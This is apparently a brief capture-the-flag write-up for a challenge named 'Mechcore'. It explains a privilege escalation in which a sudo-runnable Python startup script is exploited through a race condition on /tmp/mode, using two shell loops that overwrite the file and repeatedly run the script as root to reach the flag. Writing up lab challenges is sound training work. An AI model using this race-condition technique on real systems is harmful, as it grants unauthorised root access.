## Mechcore

By running sudo -l we can see there is a startup file we can run as sudo.

We need to exploit a race condition that will let us go into maintenance mode by writing `MAINTENANCE` into the `/tmp/mode` file after the script writes `IDLE` in it at the beginning of its execution but before it gets read.

One possible way to exploit it is:

```shell
while true; do echo -n "MAINTENANCE" > /tmp/mode; sync /tmp/mode; done &
while true; do sudo /usr/bin/python3 /home/mechcore/startup.py; done
```

Flag is in /root/flag.txt